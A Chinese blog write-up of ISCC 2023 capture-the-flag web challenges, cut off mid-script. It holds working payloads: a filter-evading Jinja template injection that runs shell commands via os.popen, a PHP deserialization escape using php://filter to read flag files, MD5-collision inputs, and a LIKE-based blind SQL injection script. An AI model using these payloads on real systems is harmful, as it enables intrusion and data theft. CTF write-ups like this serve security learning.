<!-- build time:Tue Jul 18 2023 18:54:44 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="ISCC"><link rel="canonical" href="https://blog.xcu.icu/2023/06/01/ISCC2023/"><title>ISCC2023 - WP | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">ISCC2023</h1><div class="meta"><span class="item" title="创建时间：2023-06-01 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-06-01T00:00:00+08:00">2023-06-01</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>48k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>43 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/85.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/82.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/79.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/100.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/86.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/4.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/WP/" itemprop="item" rel="index" title="分类于 WP"><span itemprop="name">WP</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2023/06/01/ISCC2023/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h2 id="web"><a class="anchor" href="#web">#</a> Web</h2><h3 id="羊了个羊"><a class="anchor" href="#羊了个羊">#</a> 羊了个羊</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011302664.png" alt="image-20230501130234361"></p><p>网址前加上 view-source: 查看源码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011303811.png" alt="image-20230501130347598"></p><p>解码得到 flag</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011304425.png" alt="image-20230501130419360"></p><h3 id="小周的密码锁"><a class="anchor" href="#小周的密码锁">#</a> 小周的密码锁</h3><p>页面上一个参数</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231614225.png" alt="image-20230523161457189"></p><p>隐藏了一个参数，这里在前段写死了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231614271.png" alt="image-20230523161447232"></p><p>尝试修改值，到 5 的时候看见了源码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231615438.png" alt="image-20230523161549377"></p><pre><code class="language-php">&lt;?php
    function MyHashCode($str)
    &#123;
        $h = 0;
        $len = strlen($str);
        for ($i = 0; $i &lt; $len; $i++) &#123;
            $hash = intval40(intval40(40 * $hash) + ord($str[$i]));
        &#125;
        return abs($hash);
    &#125;
    
    function intval40($code)
    &#123;
        $falg = $code &gt;&gt; 32;
        if ($falg == 1) &#123;
            $code = ~($code - 1);
            return $code * -1;
        &#125; else &#123;
            return $code;
        &#125;
    &#125;
    function Checked($str)&#123;
        $p1 = '/ISCC/';
        if (preg_match($p1, $str))&#123;
            return false;
        &#125;
        return true;
    &#125;

    function SecurityCheck($sha1,$sha2,$user)&#123;
        
        $p1 = '/^[a-z]+$/';
        $p2 = '/^[A-Z]+$/';

        if (preg_match($p1, $sha1) &amp;&amp; preg_match($p2, $sha2))&#123;
            $sha1 = strtoupper($sha1);
            $sha2 = strtolower($sha2);
            $user = strtoupper($user);
            $crypto = $sha1 ^ $sha2;
        &#125;
        else&#123;
            die(&quot;wrong&quot;);
        &#125;       

        return array($crypto, $user);
    &#125;
    error_reporting(0);
    
    $user = $_GET['username'];//user
    $sha1 = $_GET['sha1'];//sha1
    $sha2 = $_GET['‮⁦//sha2⁩⁦sha2'];
    //‮⁦see me ⁩⁦can you 

    if (isset ($_GET['password'])) &#123;
        if ($_GET['password2'] == 5)&#123;
            show_source(__FILE__);
        &#125;
        else&#123;
            //Try to encrypt
            if(isset($sha1) &amp;&amp; isset($sha2) &amp;&amp; isset($user))&#123;
                [$crypto, $user] = SecurityCheck($sha1,$sha2,$user);
                if((substr(sha1($crypto),-6,6) === substr(sha1($user),-6,6)) &amp;&amp; (substr(sha1($user),-6,6)) === 'a05c53')&#123;//welcome to ISCC
                    
                    if((MyHashcode(&quot;ISCCNOTHARD&quot;) === MyHashcode($_GET['password']))&amp;&amp;Checked($_GET['password']))&#123;
                        include(&quot;f1ag.php&quot;);
                        echo $flag;
                    &#125;else&#123;
                        die(&quot;就快解开了!&quot;);
                    &#125;
                    
                &#125;
                else&#123;
                    die(&quot;真的想不起来密码了吗?&quot;);
                &#125;
            &#125;else&#123;
                die(&quot;密钥错误!&quot;);
            &#125;
        &#125;    
    &#125;        

    mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 1e4) + rand(1, 1e4));
?&gt;
</code></pre><p>这里有 Unicode 标准中定义的控制字符，这里传入 //sha2% E2%81% A9% E2%81% A6sha2 即可</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231623339.png" alt="image-20230523162310303"></p><p>这里判断 sha1 大写，sha2 小写异或后得到 crypto，这里先将所有可能获取</p><pre><code class="language-php">&lt;?php

$str1='abcdefghijklmnopqrstuvwxyz';
$str2='ABCDEFGHIJKLMNOPQRSTUVWXYZ';
for ($i=0;$i&lt;strlen($str1);$i++)&#123;
    for ($j=0;$j&lt;strlen($str2);$j++)&#123;

        echo &quot;$str1[$i]和$str2[$j]=====&quot;;
        echo $str1[$i]^$str2[$j];
        echo &quot;\n&quot;;
    &#125;
&#125;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231656335.png" alt="image-20230523165640284"></p><p>这里能用的可见字符大概是 #&quot;%$'&amp;)(+*-,/.1032547698;!，用这几个字符爆破一下得到一个后 6 位达到题目要求的</p><pre><code class="language-php">&lt;?php
$string = '#\&quot;%$\'&amp;)(+*-,/.1032547698!;';
$targetHash = 'a05c53';

for ($i = 0; $i &lt; 999999999999999; $i++) &#123;
    $randomString = '';
    $length = mt_rand(0, 9);

    for ($j = 0; $j &lt; $length; $j++) &#123;
        $randomChar = $string[mt_rand(0, strlen($string) - 1)];
        $randomString .= $randomChar;
    &#125;

    if (substr(sha1($randomString), -6) === $targetHash) &#123;
        echo $randomString . &quot;\n&quot;;
    &#125;
&#125;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231710538.png" alt="image-20230523171014503"></p><p>这里选用一个最短的 79;4&quot; 找到对应的字符，sha1=aaaaa&amp;sha2=VXZUC</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231626044.png" alt="image-20230523162613992"></p><p>这里 sha1 和 user 的值 sha 后，后 6 位相同同时为 a05c53</p><pre><code class="language-php">&lt;?php
for($i=0;$i&lt;9999999999;$i++)&#123;
    if(substr(sha1($i),-6,6)==&quot;a05c53&quot;)&#123;
        echo $i;
        echo &quot;\n&quot;;
    &#125;
&#125;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231631214.png" alt="image-20230523163133178"></p><p>这些值都满足条件，取其一即可</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231714457.png" alt="image-20230523171458413"></p><p>最后一个 if</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231628079.png" alt="image-20230523162841005"></p><p>这里通过 MyHashcode 和 checked 检查 password</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231716616.png" alt="image-20230523171602567"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231716018.png" alt="image-20230523171613926"></p><p>不能包含 ISCC，这里还是暴力一点，写一个脚本爆破一下</p><pre><code class="language-php">&lt;?php
error_reporting(0);
function MyHashCode($str)
&#123;
    $h = 0;
    $len = strlen($str);//11 //字符串长度
    for ($i = 0; $i &lt; $len; $i++) &#123;
        $hash = intval40(intval40(40 * $hash) + ord($str[$i])); //40次哈希
    &#125;
    return abs($hash); //取绝对值
&#125;

function intval40($code) //40位整数
&#123;
    $falg = $code &gt;&gt; 32; //判断是否为负数
    if ($falg == 1) &#123; //如果是负数
        $code = ~($code - 1); //取反加一
        return $code * -1; //取负数
    &#125; else &#123;
        return $code; //正数
    &#125;
&#125;

$length = 4; // 指定生成的随机字符的位数
for ($j=0;$j&lt;99999999;$j++) &#123;
    $randomString = '';
    for ($i = 0; $i &lt; $length; $i++) &#123;
        $randomChar = chr(mt_rand(0, 255));
        $randomString .= $randomChar;
    &#125;
    $randomString=urlencode($randomString);
//    echo urlencode($randomString).&quot;\n&quot;;
    if (MyHashcode(&quot;ISCC&quot;)===MyHashcode(urldecode($randomString)))&#123;
        echo $randomString.&quot;\n&quot;;
    &#125;
&#125;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231823503.png" alt="image-20230523182344443"></p><p>最后的 payload</p><pre><code class="language-perl">http://47.94.14.162:10008/?password=K%00%B8%BBNOTHARD&amp;username=14987637&amp;sha1=aaaaa&amp;%E2%80%AE%E2%81%A6//sha2%E2%81%A9%E2%81%A6sha2=VXZUC
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231827603.png" alt="image-20230523182758546"></p><h3 id="老狼老狼几点了"><a class="anchor" href="#老狼老狼几点了">#</a> 老狼老狼几点了</h3><p>这个时间因为信息很少，只能去尝试一下时间</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231831475.png" alt="image-20230523183128437"></p><p>最后发现输入 12 会跳转到 guess_time.php</p><pre><code class="language-php"> &lt;?php
//&quot;Hello! welcome to ISCC, wish you have a great time!&quot;;
header(&quot;Content-type:text/html;charset=utf-8&quot;);
error_reporting(0);
echo time();

class what_time_is_it&#123;
    protected $func, $target;

    public function __construct($show_time)&#123;
        $this-&gt;func = $show_time;
    &#125;

    public function __wakeup()&#123;
        echo &quot;wakeup&quot;;
    &#125;

    public function call_func()&#123;
        $lets_show_time = unserialize($this-&gt;filter($this-&gt;func));
        if($lets_show_time['function'] == &quot;show_time&quot;)&#123;
            echo 'The time is: &quot;. date(&quot;h:i:sa&quot;, time()). &quot;&lt;br&gt;';
        &#125;
        else if($lets_show_time['function'] == &quot;hack&quot;)&#123;
            file_put_contents('time.php', &quot;&lt;?php echo 'The time is: &quot;. date(&quot;h:i:sa&quot;, time()). &quot;&lt;br&gt;';&quot;);
            echo &quot;做撚啊做，你还是看看时间吧&quot;;
            include($lets_show_time['file']);
        &#125;
        else
            highlight_file(__file__);
    &#125;

    private function filter($s)&#123;
        return preg_replace('/base64/i','', $s);
    &#125;

    public function __destruct()&#123;
        $this-&gt;call_func();
    &#125;

&#125;

if($_SESSION) unset($_SESSION);
$p1 = $_POST['param1'];
$p2 = $_POST['param2'];
$_SESSION['function'] = isset($_GET['func']) ? $_GET['func'] : &quot;highlight_file&quot;;
$_SESSION['file'] = 'time.php';
if ($p1 !== $p2 &amp;&amp; md5($p1) === md5($p2))&#123;
    if (substr($p1, 0, 10) === strval(time()))&#123;
        echo &quot;Just the time&quot;;
        extract($_POST);
        $_SESSION['file'] = 'time.php';
        $_SESSION['function'] = &quot;show_time&quot;;
    &#125;
    else&#123;
        echo &quot;Sorry wrong time!&quot;;
    &#125;
&#125;
$let_me_show_time = serialize($_SESSION).&quot;&lt;br&gt;&quot;;
$a = new what_time_is_it($let_me_show_time);
</code></pre><p>先看 if</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231837124.png" alt="image-20230523183745040"></p><p>md5 强碰撞，且 $p1 前 10 位等于当前时间戳这里使用 fastcoll 工具来生成<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NodWFpY2VuZ2xvdTMwMzIvYXJ0aWNsZS9kZXRhaWxzLzExODE5NzkwNA=="> (78 条消息) 使用 fastcoll 生成字符串 MD5 碰撞_KogRow 的博客 - CSDN 博客</span></p><pre><code class="language-php">&lt;?php 
function readmyfile($path)&#123;
$fh = fopen($path, &quot;rb&quot;);
$data = fread($fh, filesize($path));
fclose($fh);
return $data;
&#125;
system(&quot;E:\\webtools\\fastcoll_v1.0.0.5\\fastcoll_v1.0.0.5.exe ./1.txt&quot;);
$a = urlencode(readmyfile(&quot;./1_msg2.txt&quot;));
$b = urlencode(readmyfile(&quot;./1_msg1.txt&quot;));
unlink(&quot;./1_msg2.txt&quot;);
unlink(&quot;./1_msg1.txt&quot;);
echo &quot;\n&quot;;
// if(md5((string)urldecode($a))===md5((string)urldecode($b)))&#123;
// echo $a.&quot;\n&quot;;
// &#125;
// if(urldecode($a)!=urldecode($b))&#123;
// echo $b;
// &#125;
echo &quot;param1=$a&amp;param2=$b&quot;;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231856255.png" alt="image-20230523185624197"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231906896.png" alt="image-20230523190635845"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231907404.png" alt="image-20230523190731282"></p><p>这里进入了这个 if，所以需要让 $_session [‘function’] 不等于’show_time’而等于 hack</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231911998.png" alt="image-20230523191103945"></p><p>这里是用 extract 函数接受 post 参数，直接变量覆盖，然后利用文件包含去读文件，利用 base64 进行字符串逃逸</p><pre><code class="language-php">&lt;?php 
function readmyfile($path)&#123;
$fh = fopen($path, &quot;rb&quot;);
$data = fread($fh, filesize($path));
fclose($fh);
return $data;
&#125;
system(&quot;E:\\webtools\\fastcoll_v1.0.0.5\\fastcoll_v1.0.0.5.exe ./1.txt&quot;);
$a = urlencode(readmyfile(&quot;./1_msg2.txt&quot;));
$b = urlencode(readmyfile(&quot;./1_msg1.txt&quot;));
unlink(&quot;./1_msg2.txt&quot;);
unlink(&quot;./1_msg1.txt&quot;);
echo &quot;\n&quot;;
// if(md5((string)urldecode($a))===md5((string)urldecode($b)))&#123;
// echo $a.&quot;\n&quot;;
// &#125;
// if(urldecode($a)!=urldecode($b))&#123;
// echo $b;
// &#125;
echo &quot;param1=$a&amp;param2=$b&amp;_SESSION[a]=base64base64base64&amp;_SESSION[aaa]=;s:4:\&quot;file\&quot;;s:62:\&quot;php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php\&quot;;s:8:\&quot;function\&quot;;s:4:\&quot;hack\&quot;;s:8:\&quot;function\&quot;;s:4:\&quot;hack\&quot;;&#125;&quot;;
</code></pre><p>最后的 payload</p><pre><code class="language-perl">param1=1684843960%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%CA%BF%D7%60%1F6rcJ%9F%85%C7L%9CP%E6%26%B5C%E0%2F%12Z%F62Jy%F9%10%92%26%C3%93%0B%C1%E1%E8%E3%11%C1%C7%BF%BA%22%15%9E%1D%0D%8CRM%3A%7Cv%C8%FE%5E%F6P%24%DB%E4%D1L%04%0B%ED%22E%CAA%0F%E1%A3%FB%07%B1%8C%D2%8F%C6J%A9%FA%F8%F9%60U%CD%17%18%C5%5D%19%5D%B2%3B%29%DF%D6Y%B9%AD%07%85%8F%C0%AF%B0%91z%EC%DF%2C%03%AC%FCS%00b%AB%D4%23%C4S%DB%3Dg&amp;param2=1684843960%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%CA%BF%D7%60%1F6rcJ%9F%85%C7L%9CP%E6%26%B5C%60%2F%12Z%F62Jy%F9%10%92%26%C3%93%0B%C1%E1%E8%E3%11%C1%C7%BF%BA%22%15%1E%1D%0D%8CRM%3A%7Cv%C8%FE%5E%F6P%A4%DB%E4%D1L%04%0B%ED%22E%CAA%0F%E1%A3%FB%07%B1%8C%D2%8F%C6J%A9z%F8%F9%60U%CD%17%18%C5%5D%19%5D%B2%3B%29%DF%D6Y%B9%AD%07%85%8F%C0%AF%B0%11%7B%EC%DF%2C%03%AC%FCS%00b%AB%D4%23DS%DB%3Dg&amp;_SESSION[a]=base64base64base64&amp;_SESSION[aaa]=;s:4:&quot;file&quot;;s:62:&quot;php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php&quot;;s:8:&quot;function&quot;;s:4:&quot;hack&quot;;s:8:&quot;function&quot;;s:4:&quot;hack&quot;;&#125;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305232013022.png" alt="image-20230523201305959"></p><h3 id="chatggg"><a class="anchor" href="#chatggg">#</a> ChatGGG</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305232044091.png" alt="image-20230523204412046"></p><p>很有意思的一个题，很明显是模版注入，这里过滤了不少字符，大概差不多就下面这些</p><p>waf：_，class，or，+，*，init，base，global，builtin，.</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305232050135.png" alt="image-20230523205058089"></p><p>这里得到提示，就在 fllaaag.txt 里面，那么就很明显了，这里只要想办法绕过即可，关键字几乎都被过滤，这里考虑使用编码绕过，点号被过滤使用 attr 绕过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305240123856.png" alt="image-20230524012330774"></p><p>成功了，这里开始构建 payload</p><pre><code class="language-perl">&#123;%print(((((((((""|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"))|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f"))|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f"))()|attr(140))|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f"))|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")))|attr("\u0067\u0065\u0074")("\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f"))|attr("\u0067\u0065\u0074")("\u0065\u0076\u0061\u006c")("\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0063\u0061\u0074\u0020\u0066\u002a\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029"))%&#125;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305240122699.png" alt="image-20230524012238588"></p><h3 id="iscc疯狂购物节-1"><a class="anchor" href="#iscc疯狂购物节-1">#</a> ISCC 疯狂购物节 - 1</h3><p>这里先注册登录后发现这里名字经过编码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241149473.png" alt="image-20230524114902422"></p><p>阿里嘎多美羊羊桑，这里寻找解码后美羊羊的值</p><pre><code class="language-python">import time
import parsel
import requests
import base64
import re


def extract_info(html):
    # 提取描述信息
    description_match = re.search(r'&lt;h5&gt;描述:&amp;nbsp&amp;nbsp(.+?)&lt;/h5&gt;', html)
    description = description_match.group(1).strip() if description_match else &quot;无描述信息&quot;

    # 提取颜值信息
    yanzhi_match = re.search(r'魅力值:&lt;span style=&quot;color: red;&quot;&gt;(.+?)&lt;/span&gt;', html)
    yanzhi = yanzhi_match.group(1).strip() if yanzhi_match else &quot;无颜值信息&quot;

    # 提取智慧值
    wisdom_match = re.search(r'智慧值:&lt;span&gt;(.+?)&lt;/span&gt;', html)
    wisdom_value = wisdom_match.group(1).strip() if wisdom_match else &quot;无智慧值信息&quot;

    # 提取体力值
    strength_match = re.search(r'体力值:&lt;span&gt;(.+?)&lt;/span&gt;', html)
    strength_value = strength_match.group(1).strip() if strength_match else &quot;无体力值信息&quot;

    # 提取爱情值
    love_match = re.search(r'爱情值:&lt;span&gt;(.+?)&lt;/span&gt;', html)
    love_value = love_match.group(1).strip() if love_match else &quot;无爱情值信息&quot;

    # 返回提取的信息
    return &#123;
        '描述': base64.b64decode(description).decode('utf-8'),
        '颜值': yanzhi,
        '智慧值': wisdom_value,
        '体力值': strength_value,
        '爱情值': love_value
    &#125;


bulei=''
max=0
id=''
name=''
for i in range(1,999999):
    url=&quot;http://47.94.14.162:10001/Details/search?id=&#123;&#125;&quot;.format(i)
    print(url)
    cookie = &#123;
        'csrftoken': 'qk1ya0UNlGvPeAQjKYmLl8To2D8UL2T28WJ1xUYxTc5PRqgB8i2VXXTbLxY3ONvY',
        'PHPSESSID': 'v6q21f2a4m8udue4664j1ooh5u',
        'Auth_Key': 'XxA8UIdzpPzCjX%2FdPFgGgg%3D%3D',
        'Cyber_info': 'GODICWnAlGHG5KhM%2F%2Bl%2FmDL%2FT%2B%2FM%2B3Y06%2BvUFqxxpq4W4KmKr8C0rizMmoIfZJnweV4VafZ7iLVEXGWmgB95%2BUIRceCkk5gY2BI9bX9E%2F9Q%3D',
        'sessionid': 'o0ovlujwnxex4j6uku6xe82xzskdm8yr',
        'messages': '.eJyLjlaKj88qzs-Lz00tLk5MT1XSMdAxMdBRUogpNTVONoopNTM1N4gptTQ1tIwptUhKTVNUitUZhppiAe3zT6I:1q1djr:BifAVF-RDnVlwPGPehNqAZGpFPcISil7vJyaqsaJnvQ'
    &#125;
    header=&#123;
        &quot;Cache-Control&quot;: &quot;max-age=0&quot;,
        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;,
        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,
        &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,ru;q=0.8,eo;q=0.7&quot;,
        &quot;Connection&quot;: &quot;close&quot;
    &#125;
    response = requests.get(url=url,cookies=cookie,headers=header)
    # print(response.text)
    while (response.text.find('too fast!!!') &gt; 0):
        time.sleep(2)
    while(response.text.find('innerHTML=Math.round(Math.random()*100)')&gt;0):
        time.sleep(2)
        response = requests.get(url=url, cookies=cookie, headers=header)
    print(str(i)+&quot;======&quot;)
    time.sleep(1)
    info = extract_info(response.text)
    for key, value in info.items():
        print(str(key) + ': ' + str(value))
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241150113.png" alt="image-20230524115019060"></p><p>最后发现在 487561 识别了一个很奇怪的值，而且体力值是一个 ip</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241239968.png" alt="image-20230524123932900"></p><p>去访问看一下，去年的套路今年接着用，，，，挺离谱</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241240835.png" alt="image-20230524124052761"></p><p>羊名解码后果然是美羊羊，也看到描述有 fl4g 注入点就在这个地方了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241242362.png" alt="image-20230524124208287"></p><p>在这里输入危险字符发现有过滤，应该是 sql 注入，注入点就在这里了，简单测试一下 waf</p><pre><code>waf： =，/*，select，and，or，union，【空格】，sleep，'，&quot;，','，&lt;&gt;，regexp
</code></pre><p>限制很多，这里 union 和 ',' 都被过滤，就不考虑常规的注入，这里发现 like 没有过滤，这里利用 like 盲注</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241954386.png" alt="image-20230524195442323"></p><p>可以看到是由 fl4g 这个列，因为单引号和双引号被过滤，所以这里使用编码方式绕过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241951402.png" alt="image-20230524195120332"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241951519.png" alt="image-20230524195140441"></p><p>这里可以看到第一个字符是 I，写个脚本来爆破一下，发现有长度限制，这里用模糊查询</p><pre><code class="language-python">import requests
import time

cookies = &#123;
    'csrftoken': 'xm0lmDwgZibp3KuHHgFjgHb3b9Lo2PxpdcHz6TqmuHKl731mlg4sT1t8C7LVXjTv',
    'PHPSESSID': 'v6q21f2a4m8udue4664j1ooh5u',
    'Auth_Key': 'XxA8UIdzpPzCjX%2FdPFgGgg%3D%3D',
    'Cyber_info': 'GODICWnAlGHG5KhM%2F%2Bl%2FmDL%2FT%2B%2FM%2B3Y06%2BvUFqxxpq4W4KmKr8C0rizMmoIfZJnweV4VafZ7iLVEXGWmgB95%2BUIRceCkk5gY2BI9bX9E%2F9Q%3D',
    'sessionid': 'lkipk7j8axhrt344kou1bbkd9jvor3m1',
&#125;

headers = &#123;
    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,
    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;,
    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,
    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;,
    &quot;Connection&quot;: &quot;close&quot;
&#125;
flag='&#125;'
str1='&#125;'
str2=''
str_list = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;'
while(1):
    for i in str_list:
        # url = f&quot;http://47.94.14.162:10001/Details/search?id=-487561)||fl4g%20like%20binary%200x25&#123;bytes(str1,'utf-8').hex()&#125;&#123;bytes(str2,'utf-8').hex()&#125;&#123;bytes(i,'utf-8').hex()&#125;25--+&quot;#拿前一部分
